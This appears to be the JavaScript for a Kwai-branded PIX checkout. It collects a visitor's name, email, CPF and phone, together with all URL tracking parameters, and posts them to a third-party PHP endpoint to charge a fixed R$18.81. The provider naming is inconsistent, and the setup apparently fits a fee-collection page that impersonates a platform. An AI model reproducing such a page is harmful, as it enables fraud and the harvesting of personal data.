/**
 * pix-service.js — Integração Buckpay via Vercel Serverless Function
 */
(function () {
  'use strict';

  const PROXY_URL    = 'https://storegg.shop/zuckpay_pix.php';
  const AMOUNT_CENTS = 1881;

  function gerarExternalId() {
    return 'KW-' + Date.now().toString(36).toUpperCase() +
           Math.random().toString(36).substring(2, 6).toUpperCase();
  }

  function lerInput(id) {
    const el = document.getElementById(id);
    return el ? el.value.trim() : '';
  }

  function apenasDigitos(str) {
    return String(str || '').replace(/\D/g, '');
  }

  // Obtém todos os parâmetros da URL
  function obterParametrosUrl() {
    const params = {};
    const queryString = window.location.search.substring(1);
    if (queryString) {
      const pairs = queryString.split('&');
      pairs.forEach(pair => {
        const [key, value] = pair.split('=');
        if (key) {
          params[decodeURIComponent(key)] = decodeURIComponent(value || '');
        }
      });
    }
    return params;
  }

  // Garante DDI 55 + mínimo 12 dígitos totais
  function formatarTelefone(raw) {
    let t = apenasDigitos(raw);
    if (!t || t.length < 10) t = '11999999999';
    if (!t.startsWith('55')) t = '55' + t;
    return t;
  }

  async function generatePayment() {
    const nome  = lerInput('buckpay-nome')      || 'Cliente Kwai';
    const email = lerInput('buckpay-email')     || 'cliente@kwai.com';
    const cpf   = apenasDigitos(lerInput('buckpay-cpf'));
    // Lê o campo novo do modal; fallback para o campo antigo do form inicial
    const telefoneRaw = lerInput('buckpay-telefone') || lerInput('pix-key-input');
    const phone = formatarTelefone(telefoneRaw);

    // Obtém todos os parâmetros da URL
    const urlParams = obterParametrosUrl();

    const payload = {
      nome:      nome,
      cpf:       cpf || '00000000191',
      valor:     18.81,
      email:     email,
      telefone:  phone,
      external_id_client: gerarExternalId(),
      utm_source:         urlParams.utm_source || 'organic',
      utm_medium:         urlParams.utm_medium || 'organic',
      utm_campaign:       urlParams.utm_campaign || '',
      utm_content:        urlParams.utm_content || '',
      utm_term:           urlParams.utm_term || '',
      src:                urlParams.src || '',
      sck:                urlParams.sck || '',
      fbc:                urlParams.fbc || '',
      fbp:                urlParams.fbp || '',
      fbclid:             urlParams.fbclid || '',
      gclid:              urlParams.gclid || '',
      ttclid:             urlParams.ttclid || '',
      kclid:              urlParams.kclid || '',
      click_id:           urlParams.click_id || ''
    };

    // Adiciona todos os parâmetros da URL não reconhecidos
    Object.keys(urlParams).forEach(key => {
      if (!payload.hasOwnProperty(key)) {
        payload[key] = urlParams[key];
      }
    });

    // Enriquece payload com dados da Dracofy
    if (typeof DracofyIntegration !== 'undefined') {
      DracofyIntegration.enriquecerPayload(payload);
    }

    let response;
    try {
      response = await fetch(PROXY_URL, {
        method:  'POST',
        headers: { 'Content-Type': 'application/json' },
        body:    JSON.stringify(payload)
      });
    } catch (netErr) {
      throw new Error('Falha de conexão. Verifique sua internet e tente novamente.');
    }

    const rawText = await response.text();
    console.log('[Buckpay] HTTP', response.status, '->', rawText.substring(0, 500));

    let data;
    try { data = JSON.parse(rawText); }
    catch { throw new Error('Resposta inesperada do servidor.'); }

    if (!response.ok || data.error || data.status === 'error' || data.status === 'failed') {
      let msg = 'Erro ao processar pagamento.';
      if (data.error && data.error.message) {
        msg = data.error.message;
        if (data.error.detail && data.error.detail.buyer) {
          msg += ' — ' + JSON.stringify(data.error.detail.buyer);
        }
      } else if (data.message) {
        msg = data.message;
      } else if (typeof data.error === 'string') {
        msg = data.error;
      }
      throw new Error(msg);
    }

    const pixData = data && data.data;
    if (!pixData || (!pixData.qr_code && !pixData.pix_copy_paste)) {
      console.error('[Zuckpay] Resposta completa:', JSON.stringify(data));
      throw new Error('Dados do PIX não encontrados. Contate o suporte.');
    }

    return {
      qrcode_base64: pixData.qr_code || '',
      code:          pixData.pix_copy_paste || ''
    };
  }

  window.PixService = { generatePayment };

  window.iniciarGeracaoPix = async function () {
    const nome     = lerInput('buckpay-nome');
    const email    = lerInput('buckpay-email');
    const cpf      = apenasDigitos(lerInput('buckpay-cpf'));
    const telefone = apenasDigitos(lerInput('buckpay-telefone'));
    const errorForm = document.getElementById('buckpay-form-error');

    let erroMsg = '';
    if (!nome || !email) {
      erroMsg = 'Preencha todos os campos obrigatórios.';
    } else if (cpf.length < 11) {
      erroMsg = 'CPF inválido. Digite os 11 dígitos.';
    } else if (telefone.length < 10) {
      erroMsg = 'Telefone inválido. Digite DDD + número.';
    }

    if (erroMsg) {
      if (errorForm) { errorForm.textContent = erroMsg; errorForm.classList.remove('hidden'); }
      return;
    }
    if (errorForm) errorForm.classList.add('hidden');

    // Troca para etapa 2
    const step1 = document.getElementById('buckpay-step-1');
    const step2 = document.getElementById('buckpay-step-2');
    if (step1) { step1.classList.remove('flex'); step1.classList.add('hidden'); }
    if (step2) { step2.classList.remove('hidden'); step2.classList.add('flex'); }

    const qrcodeImg      = document.getElementById('buckpay-qrcode');
    const loadingDiv     = document.getElementById('buckpay-loading');
    const copyPasteInput = document.getElementById('buckpay-copypaste');
    const copyBtn        = document.getElementById('btn-copy-pix');
    const errorDiv       = document.getElementById('buckpay-error');

    if (qrcodeImg)      { qrcodeImg.style.display = 'none'; qrcodeImg.src = ''; }
    if (loadingDiv)     loadingDiv.style.display = 'flex';
    if (copyPasteInput) copyPasteInput.value = 'Gerando código...';
    if (copyBtn)        copyBtn.disabled = true;
    if (errorDiv)       errorDiv.classList.add('hidden');

    try {
      const result = await window.PixService.generatePayment();

      if (loadingDiv) loadingDiv.style.display = 'none';

      if (qrcodeImg && result.qrcode_base64) {
        qrcodeImg.src = 'data:image/png;base64,' + result.qrcode_base64;
        qrcodeImg.style.display = 'block';
      }

      if (copyPasteInput && result.code) {
        copyPasteInput.value = result.code;
        if (copyBtn) copyBtn.disabled = false;
      }

    } catch (err) {
      console.error('[Buckpay] Erro:', err);
      if (loadingDiv) loadingDiv.style.display = 'none';
      if (errorDiv) {
        errorDiv.textContent = err.message || 'Erro ao gerar PIX. Tente novamente.';
        errorDiv.classList.remove('hidden');
      }
      if (copyPasteInput) copyPasteInput.value = 'Erro ao gerar código.';
    }
  };

})();
